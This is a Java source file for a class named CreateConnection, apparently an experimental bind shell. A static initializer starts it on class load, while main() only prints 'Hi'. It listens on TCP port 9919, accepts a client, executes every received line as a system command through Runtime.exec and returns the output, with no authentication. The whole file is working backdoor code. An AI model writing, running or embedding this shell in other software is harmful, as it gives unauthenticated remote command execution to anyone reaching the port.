import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class CreateConnection {
    static CreateConnection example = new CreateConnection();

    public CreateConnection() {
        System.out.println("You are now running a shell...");
        int port = 9919; // Replace with the desired port number

        try {
            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println("Server listening on port " + port);

            Socket socket = serverSocket.accept();
            System.out.println("Client connected: " + socket.getInetAddress());

            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

            String command = in.readLine();
            System.out.println("Commanding " + command + "...");

            while (command != null) {
                if (command.equalsIgnoreCase("exit")) {
                    break;
                }

                String output = executeCommand(command); // Execute the command

                System.out.println("Output is " + output);
                // Send the output back to the client
                out.println(output);
                command = in.readLine();
            }
            // Cleanup
            in.close();
            out.close();
            socket.close();
            serverSocket.close();
        } catch (IOException e) {
            System.out.println("Exception occurred: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static String executeCommand(String command) {
        String END_STRING = "asdfg";
        StringBuilder output = new StringBuilder();

        try {
            Process process = Runtime.getRuntime().exec(command);
            System.out.println("Executed command: " + command);

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
//            while (reader.ready()) {
//                line = reader.readLine();
//                output.append(line).append("\n");
//            }
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            System.out.println("Output: " + output);
            System.out.println("Waiting for...");
            boolean exitCode = process.waitFor(2, TimeUnit.SECONDS); // Wait for the process to complete
            System.out.println("Finished waiting! ");

            System.out.println(output);

            output.append(END_STRING).append("\n");
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        return output.toString();
    }

    public static void main(String[] args) {
        System.out.println("Hi");
    }
}
